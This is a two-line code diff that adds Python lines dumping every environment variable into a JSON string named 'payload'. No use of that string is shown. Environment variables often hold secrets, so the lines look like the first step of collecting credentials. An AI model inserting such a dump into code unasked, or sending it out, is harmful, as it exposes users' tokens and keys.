@@ -1,0 +1,2 @@
+import json, os
+payload = json.dumps(dict(os.environ))
